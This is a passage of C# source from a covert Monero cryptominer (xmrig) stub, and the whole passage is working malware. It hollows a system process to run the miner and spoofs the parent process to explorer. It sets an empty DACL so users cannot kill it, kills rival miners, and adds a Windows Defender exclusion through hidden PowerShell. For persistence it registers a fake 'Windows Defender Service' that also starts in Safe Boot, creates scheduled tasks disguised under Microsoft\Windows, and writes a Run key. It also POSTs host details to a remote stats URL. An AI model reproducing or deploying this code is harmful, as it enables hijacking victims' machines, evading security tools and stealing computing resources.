                Log("Watchdog: scheduled tasks restored");
            }
        }
        catch { }
    }

    // ── Process hollowing (NtCreateSection/NtMapViewOfSection + context patch) ─
    // Mirrors the RAT's ProcessHollowing.cs approach:
    // write PE to temp → NtCreateSection(SEC_IMAGE) → NtMapViewOfSection into
    // target → GetThreadContext → patch Rip to new entry point → SetThreadContext
    // → ResumeThread. No manual relocation patching needed; the OS handles it.
    private static void LaunchHollowed(string hollowTarget, string cfgPath, int cpuHint)
    {
        if ((_xmrigBytes ?? Array.Empty<byte>()).Length < 64) return;

        string target = hollowTarget;
        if (!Path.IsPathRooted(target))
            target = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), target);
        Log($"LaunchHollowed: target={target} exists={File.Exists(target)} xmrigBytes={_xmrigBytes?.Length ?? 0}");
        if (!File.Exists(target)) { Log("Target not found — abort"); return; }

        // Read entry point RVA directly from in-memory PE bytes
        int  ntOff = BitConverter.ToInt32((_xmrigBytes ?? Array.Empty<byte>()), 0x3C);
        uint epRva = BitConverter.ToUInt32((_xmrigBytes ?? Array.Empty<byte>()), ntOff + 0x28); // AddressOfEntryPoint
        Log($"PE ntOff=0x{ntOff:X} epRva=0x{epRva:X}");

        string tmpPath = Path.Combine(Path.GetTempPath(),
            Path.GetRandomFileName().Replace(".", "") + ".tmp");

        nint hFile = 0, hSect = 0, localBase = 0, remoteBase = 0, ctxPtr = 0, ctxRaw = 0;
        var pi = new PROCESS_INFORMATION();
        bool success = false;

        try
        {
            // 1. Write xmrig to temp file, open with SEC_IMAGE-compatible access
            var xmrigData = _xmrigBytes ?? Array.Empty<byte>();
            File.WriteAllBytes(tmpPath, xmrigData);
            Log($"Wrote {xmrigData.Length} bytes to {tmpPath}");

            hFile = CreateFileW(tmpPath, 0x80000000u | 0x20000000u, 1u, 0, 3u, 0x80u, 0);
            if (hFile == -1 || hFile == 0) { Log($"CreateFile FAILED err=0x{Marshal.GetLastWin32Error():X}"); return; }

            // 2. NtCreateSection(SEC_IMAGE) from temp file
            int st = NtCreateSection(out hSect,
                0x0004u | 0x0008u, // SECTION_MAP_READ | SECTION_MAP_EXECUTE
                0, 0, 0x20u /*PAGE_EXECUTE_READ*/, 0x1000000u /*SEC_IMAGE*/, hFile);
            CloseHandle(hFile); hFile = 0;
            Log($"NtCreateSection: 0x{st:X8} hSect=0x{hSect:X}");
            if (st < 0) { Log($"NtCreateSection FAILED 0x{st:X8}"); return; }

            // 3. Map locally (validate; entry point already read from raw bytes)
            nuint viewSz = 0;
            NtMapViewOfSection(hSect, GetCurrentProcess(), ref localBase, 0, 0, 0,
                ref viewSz, 2u, 0, 0x20u);

            // 4. CreateProcess(target) SUSPENDED — PPID spoof to explorer (breaks suspicious parent-child chain)
            var user = !string.IsNullOrEmpty(MinerConfig.WorkerName)
                ? $"{MinerConfig.Wallet}.{MinerConfig.WorkerName}" : MinerConfig.Wallet;
            var pass = !string.IsNullOrEmpty(MinerConfig.Password) ? MinerConfig.Password : "x";
            string cmdLine = $"\"{target}\"" +
                $" -o \"{MinerConfig.PoolUrl}\"" +
                $" -u \"{user}\" -p \"{pass}\"" +
                $" -a \"{MinerConfig.Algo}\"" +
                (MinerConfig.PoolTls ? " --tls" : "") +
                $" --no-color --donate-level=0" +
                $" --cpu-max-threads-hint={cpuHint}" +
                $" --randomx-no-rdmsr" +
                $" --http-host=127.0.0.1 --http-port=18080";
            if (_internalApiPort > 0)
                cmdLine += $" --http-host=127.0.0.1 --http-port={_internalApiPort}";
            string hollowWorkDir = Path.GetDirectoryName(cfgPath) ?? "";

            nint hParent = GetHollowSpoofParent();
            nint hParentPtr = 0, hollowAttrList = 0;
            var siEx = new STARTUPINFOEXW();
            siEx.StartupInfo.cb = (uint)Marshal.SizeOf<STARTUPINFOEXW>();
            uint hollowFlags = 0x4u | 0x08000000u; // CREATE_SUSPENDED | CREATE_NO_WINDOW
            if (hParent != 0)
            {
                nint attrSz = 0;
                InitializeProcThreadAttributeList(0, 1, 0, ref attrSz);
                hollowAttrList = Marshal.AllocHGlobal(attrSz);
                if (InitializeProcThreadAttributeList(hollowAttrList, 1, 0, ref attrSz))
                {
                    hParentPtr = Marshal.AllocHGlobal(nint.Size);
                    Marshal.WriteIntPtr(hParentPtr, hParent);
                    if (UpdateProcThreadAttribute(hollowAttrList, 0, (nint)0x00020000, hParentPtr, nint.Size, 0, 0))
                    {
                        siEx.lpAttributeList = hollowAttrList;
                        hollowFlags |= 0x00080000u; // EXTENDED_STARTUPINFO_PRESENT
                    }
                }
            }

            Log($"CreateProcessW cmd={cmdLine} ppid_spoof={hParent != 0}");
            bool cpOk = CreateProcessWEx(null, cmdLine, 0, 0, false,
                hollowFlags, 0, hollowWorkDir, ref siEx, out pi);
            if (hParentPtr != 0) Marshal.FreeHGlobal(hParentPtr);
            if (hParent    != 0) CloseHandle(hParent);
            if (hollowAttrList != 0) { DeleteProcThreadAttributeList(hollowAttrList); Marshal.FreeHGlobal(hollowAttrList); }
            Log($"CreateProcessW: ok={cpOk} PID={pi.dwProcessId} err=0x{Marshal.GetLastWin32Error():X}");
            if (!cpOk) return;

            // 5. GetThreadContext — VirtualAlloc for 16-byte alignment (avoids AVX/XSAVE corruption)
            ctxRaw = VirtualAlloc(0, 4096, 0x3000, 4 /*PAGE_READWRITE*/);
            ctxPtr = ctxRaw;
            if (ctxPtr == 0) return;
            Marshal.WriteInt32(ctxPtr + CTX_FLAGS, (int)CONTEXT_CTRL_INT);
            if (!GetThreadContext(pi.hThread, ctxPtr)) return;

            long peb = Marshal.ReadInt64(ctxPtr + CTX_RDX);

            // 6. Map PE image into remote process
            viewSz = 0;
            st = NtMapViewOfSection(hSect, pi.hProcess, ref remoteBase,
                0, 0, 0, ref viewSz, 2u, 0, 0x20u);
            Log($"NtMapViewOfSection(remote): 0x{st:X8} remoteBase=0x{remoteBase:X}");
            if (st < 0) { Log($"NtMapViewOfSection FAILED 0x{st:X8}"); return; }

            // 7. Update PEB.ImageBaseAddress → remoteBase
            nint pebIba = (nint)(peb + 0x10);
            byte[] nbBytes = BitConverter.GetBytes((long)remoteBase);
            WriteProcessMemory(pi.hProcess, pebIba, nbBytes, nbBytes.Length, out _);

            // 8. Patch RIP to entry point, then SetThreadContext
            for (int i = 0; i < CTX_SIZE; i++) Marshal.WriteByte(ctxPtr + i, 0);
            Marshal.WriteInt32(ctxPtr + CTX_FLAGS, (int)CONTEXT_CTRL_INT);
            if (!GetThreadContext(pi.hThread, ctxPtr)) return;

            Marshal.WriteInt64(ctxPtr + CTX_RIP, (long)((ulong)remoteBase + epRva));
            bool stcOk = SetThreadContext(pi.hThread, ctxPtr);
            Log($"SetThreadContext: ok={stcOk} RIP=0x{(ulong)remoteBase + epRva:X}");
            if (!stcOk) return;

            _hollowedPid = (nint)pi.dwProcessId;
            ResumeThread(pi.hThread);
            Log($"xmrig resumed in PID={pi.dwProcessId} — waiting for exit");
            while (true)
            {
                uint r = WaitForSingleObject(pi.hProcess, 2000);
                if (r != 0x102u) { Log($"xmrig exited PID={pi.dwProcessId} waitResult=0x{r:X}"); break; }
                if (_hollowKillFlag) { TerminateProcess(pi.hProcess, 0); Log("xmrig killed (stealth)"); break; }
            }
            success = true;
        }
        finally
        {
            Log($"LaunchHollowed finally: success={success} PID={pi.dwProcessId}");
            _hollowedPid = 0;
            if (localBase != 0) NtUnmapViewOfSection(GetCurrentProcess(), localBase);
            if (hSect     != 0) CloseHandle(hSect);
            if (hFile     != 0) CloseHandle(hFile);
            if (ctxRaw    != 0) VirtualFree(ctxRaw, 0, 0x8000);
            if (!success && pi.hProcess != 0) TerminateProcess(pi.hProcess, 0);
            if (pi.hThread  != 0) CloseHandle(pi.hThread);
            if (pi.hProcess != 0) CloseHandle(pi.hProcess);
            try { File.Delete(tmpPath); } catch { }
        }
    }

    [DllImport("kernel32.dll")]
    private static extern bool WriteProcessMemory(nint hProc, nint addr, byte[] buf, int sz, out nint written);



    // ── Config JSON ───────────────────────────────────────────────────────────
    private static void WriteConfig(string path, int cpuHint)
    {
        static string Js(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        string apiSection = _internalApiPort > 0
            ? $@"""http"": {{ ""enabled"": true, ""host"": ""127.0.0.1"", ""port"": {_internalApiPort}, ""restricted"": true }}"
            : @"""http"": { ""enabled"": false }";
        File.WriteAllText(path, $@"{{
  ""autosave"": false,
  ""colors"": false,
  ""donate-level"": 0,
  ""cpu"": {{ ""enabled"": true, ""max-threads-hint"": {cpuHint} }},
  ""pools"": [{{ ""url"": ""{Js(_xmrigHasOpenSsl ? MinerConfig.PoolUrl : (MinerConfig.PoolTls && _tlsProxyPort > 0 ? $"127.0.0.1:{_tlsProxyPort}" : MinerConfig.PoolUrl))}"", ""user"": ""{Js(!string.IsNullOrEmpty(MinerConfig.WorkerName) ? $"{MinerConfig.Wallet}.{MinerConfig.WorkerName}" : MinerConfig.Wallet)}"", ""pass"": ""{Js(!string.IsNullOrEmpty(MinerConfig.Password) ? MinerConfig.Password : "x")}"", ""tls"": {(MinerConfig.PoolTls && _xmrigHasOpenSsl ? "true" : "false")} }}],
  ""algo"": ""{Js(MinerConfig.Algo)}"",
  ""coin"": ""monero"",
  ""print-time"": 0,
  {apiSection}
}}");
    }

    // ── Stats reporter: polls xmrig HTTP API and POSTs to StatsUrl ────────────
    private static async Task StatsReporterAsync()
    {
        string id = Convert.ToHexString(
            System.Security.Cryptography.SHA256.HashData(
                System.Text.Encoding.UTF8.GetBytes(Environment.MachineName)))[..12];

        string cpu;
        try
        {
            nint hk = 0;
            string? cpuReg = null;
            if (RegOpenKeyExW((nint)0x80000002L /*HKLM*/,
                @"HARDWARE\DESCRIPTION\System\CentralProcessor\0", 0, 0x20019 /*KEY_READ*/, out hk) == 0)
            {
                uint type = 0, cb = 256;
                var buf = new byte[256];
                if (RegQueryValueExW(hk, "ProcessorNameString", 0, out type, buf, ref cb) == 0)
                    cpuReg = System.Text.Encoding.Unicode.GetString(buf, 0, (int)cb).TrimEnd('\0').Trim();
                RegCloseKey(hk);
            }
            cpu = cpuReg
                ?? System.Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER")
                ?? "Unknown";
        }
        catch { cpu = "Unknown"; }

        while (true)
        {
            try { await Task.Delay(30_000); } catch { return; }
            try
            {
                var json = await _http.GetStringAsync(
                    $"http://127.0.0.1:{_internalApiPort}/1/summary");
                using var doc = System.Text.Json.JsonDocument.Parse(json);
                var root = doc.RootElement;

                double h1s = 0, h60s = 0;
                int accepted = 0; long uptime = 0;
                string pool = MinerConfig.PoolUrl, algo = MinerConfig.Algo;

                if (root.TryGetProperty("hashrate", out var hr) &&
                    hr.TryGetProperty("total", out var tot) &&
                    tot.ValueKind == System.Text.Json.JsonValueKind.Array)
                {
                    var arr = tot.EnumerateArray().ToArray();
                    if (arr.Length > 0 && arr[0].ValueKind == System.Text.Json.JsonValueKind.Number)
                        h1s  = arr[0].GetDouble();
                    if (arr.Length > 2 && arr[2].ValueKind == System.Text.Json.JsonValueKind.Number)
                        h60s = arr[2].GetDouble();
                }
                if (root.TryGetProperty("uptime",   out var up))  uptime   = up.GetInt64();
                if (root.TryGetProperty("algo",     out var alg)) algo     = alg.GetString() ?? algo;
                if (root.TryGetProperty("connection", out var conn))
                {
                    if (conn.TryGetProperty("pool",     out var p)) pool     = p.GetString() ?? pool;
                    if (conn.TryGetProperty("accepted", out var a)) accepted = a.GetInt32();
                }

                var ic = System.Globalization.CultureInfo.InvariantCulture;
                var payload = $@"{{""id"":""{id}"",""hostname"":""{Environment.MachineName}"",""cpu"":""{cpu.Replace("\"","\\\"")}"",""h1s"":{h1s.ToString("F1",ic)},""h60s"":{h60s.ToString("F1",ic)},""pool"":""{pool}"",""algo"":""{algo}"",""accepted"":{accepted},""uptime"":{uptime}}}";
                var postUrl = string.IsNullOrEmpty(MinerConfig.StatsToken)
                    ? MinerConfig.StatsUrl
                    : $"{MinerConfig.StatsUrl}?key={Uri.EscapeDataString(MinerConfig.StatsToken)}";
                await _http.PostAsync(postUrl,
                    new StringContent(payload, System.Text.Encoding.UTF8, "application/json"));
            }
            catch { }
        }
    }

    // ── Built-in BotKiller ────────────────────────────────────────────────────
    // Scans every 30 s and terminates known competing miner processes.
    // Clears the critical-process flag BEFORE killing to avoid BSOD.
    private static async Task BotKillerAsync()
    {
        int myPid = Environment.ProcessId;
        while (true)
        {
            try { await Task.Delay(30_000); } catch { return; }
            foreach (var name in _botKillerTargets)
            {
                try
                {
                    foreach (var proc in Process.GetProcessesByName(name))
                    {
                        try
                        {
                            if (proc.Id == myPid) continue;
                            proc.Kill(true);
                        }
                        catch { }
                        finally { proc.Dispose(); }
                    }
                }
                catch { }
            }
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────
    private static bool IsIdle()
    {
        try
        {
            var info = new LASTINPUTINFO { cbSize = (uint)Marshal.SizeOf<LASTINPUTINFO>() };
            if (!GetLastInputInfo(ref info)) return false;
            uint idleMs = (uint)Environment.TickCount - info.dwTime;
            return idleMs >= (uint)(MinerConfig.IdleThresholdSec * 1000);
        }
        catch { return false; }
    }

    private static bool IsStealthTarget(string[] targets)
    {
        if (targets.Length == 0) return false;
        try
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    foreach (var t in targets)
                    {
                        var name = t.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ? t[..^4] : t;
                        if (p.ProcessName.Equals(name, StringComparison.OrdinalIgnoreCase)) return true;
                    }
                }
                catch { }
                finally { p.Dispose(); }
            }
        }
        catch { }
        return false;
    }

    // Sets empty DACL only — blocks OpenProcess(PROCESS_TERMINATE) from user-mode tools.
    // The critical-process flag (BSOD on kill) is applied separately ONLY to the stub
    // so it does NOT apply to the hollowed process (which would BSOD on system shutdown).
    private static void ProtectProcess(nint hProcess)
    {
        try
        {
            nint pSD = Marshal.AllocHGlobal(256);
            try
            {
                InitializeSecurityDescriptor(pSD, 1 /*SECURITY_DESCRIPTOR_REVISION*/);
                SetSecurityDescriptorDacl(pSD, true, 0 /*empty, not null*/, false);
                SetKernelObjectSecurity(hProcess, 4 /*DACL_SECURITY_INFORMATION*/, pSD);
            }
            finally { Marshal.FreeHGlobal(pSD); }
        }
        catch { }
    }


    private static void SetupSafeBootService(string exePath)
    {
        try
        {
            const uint SC_MANAGER_CREATE_SERVICE = 0x0002;
            const uint SERVICE_WIN32_OWN_PROCESS  = 0x0010;
            const uint SERVICE_AUTO_START         = 0x0002;
            const uint SERVICE_ERROR_IGNORE       = 0x0000;
            const uint SERVICE_ALL_ACCESS         = 0xF01FF;
            const uint SERVICE_CHANGE_CONFIG      = 0x0002;
            const uint SERVICE_NO_CHANGE          = 0xFFFFFFFF;
            const uint REG_SZ                     = 1;
            const uint KEY_WRITE                  = 0x20006;
            var        HKLM = new nint(unchecked((int)0x80000002u));
            var svcName = Path.GetFileNameWithoutExtension(MinerConfig.InstallName);
            var hSCM = OpenSCManagerW(0, 0, SC_MANAGER_CREATE_SERVICE);
            if (hSCM != 0)
            {
                try
                {
                    var hSvc = OpenServiceW(hSCM, svcName, SERVICE_CHANGE_CONFIG);
                    if (hSvc != 0)
                    {
                        ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
                            SERVICE_NO_CHANGE, exePath, 0, 0, 0, 0, 0, null);
                        CloseServiceHandle(hSvc);
                    }
                    else
                    {
                        hSvc = CreateServiceW(hSCM, svcName, "Windows Defender Service",
                            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
                            SERVICE_ERROR_IGNORE, exePath, 0, 0, 0, 0, 0);
                        if (hSvc != 0) CloseServiceHandle(hSvc);
                    }
                }
                finally { CloseServiceHandle(hSCM); }
            }
            foreach (var mode in new[] { "Network", "Minimal" })
            {
                var keyPath = $"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\{mode}\\{svcName}";
                if (RegCreateKeyExW(HKLM, keyPath, 0, 0, 0, KEY_WRITE, 0, out var hk, out _) == 0)
                {
                    var val = System.Text.Encoding.Unicode.GetBytes("Service\0");
                    RegSetValueExW(hk, "", 0, REG_SZ, val, (uint)val.Length);
                    RegCloseKey(hk);
                }
            }
        }
        catch { }
    }

    // Returns a PROCESS_CREATE_PROCESS handle to explorer.exe for PPID spoofing.
    // Makes the hollowed process appear as a child of explorer instead of the miner.
    private static nint GetHollowSpoofParent()
    {
        const uint PROCESS_CREATE_PROCESS = 0x0080;
        foreach (var name in new[] { "explorer", "svchost" })
        {
            try
            {
                foreach (var p in Process.GetProcessesByName(name))
                {
                    try
                    {
                        var h = OpenProcess(PROCESS_CREATE_PROCESS, false, p.Id);
                        if (h != 0) { p.Dispose(); return h; }
                    }
                    catch { }
                    finally { p.Dispose(); }
                }
            }
            catch { }
        }
        return 0;
    }

    private static void AddDefenderExclusion(string path)
    {
        try
        {
            using var p = Process.Start(new ProcessStartInfo("powershell.exe",
                $"-NonInteractive -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '{path}' -ExclusionExtension '.exe' -Force\"")
            { CreateNoWindow = true, UseShellExecute = false });
            p?.WaitForExit(6000);
        }
        catch { }
    }

    private static void SetupStartup(string exePath, string cfgPath)
    {
        try
        {
            var folderName = MinerConfig.InstallName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
                ? MinerConfig.InstallName[..^4] : MinerConfig.InstallName;
            var args = $"--config=\"{cfgPath}\"";

            // Logon task — runs stub on every login
            using var p1 = Process.Start(new ProcessStartInfo("schtasks",
                $"/create /f /tn \"Microsoft\\Windows\\{folderName}\" /sc onlogon /tr \"\\\"{exePath}\\\" {args}\" /rl highest")
            { CreateNoWindow = true, UseShellExecute = false });
            p1?.WaitForExit(5000);

            if (MinerConfig.EnableWatchdog)
            {
                // Minute-interval task — restarts miner within 60s if killed while already logged in
                // Single-instance mutex in Main prevents double-start if already running
                using var p2 = Process.Start(new ProcessStartInfo("schtasks",
                    $"/create /f /tn \"Microsoft\\Windows\\{folderName}Wd\" /sc minute /mo 1 /tr \"\\\"{exePath}\\\" {args}\" /rl highest")
                { CreateNoWindow = true, UseShellExecute = false });
                p2?.WaitForExit(5000);
            }

            // Registry Run key — backup layer if scheduled task is deleted
            const uint KEY_SET_VALUE = 0x0002;
            const uint REG_SZ        = 1;
            var        HKCU          = new nint(unchecked((int)0x80000001u));
            if (RegCreateKeyExW(HKCU, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    0, 0, 0, KEY_SET_VALUE, 0, out var hkRun, out _) == 0)
            {
                var val = System.Text.Encoding.Unicode.GetBytes($"\"{exePath}\" {args}\0");
                RegSetValueExW(hkRun, folderName, 0, REG_SZ, val, (uint)val.Length);
                RegCloseKey(hkRun);
            }
        }
        catch { }
    }

}
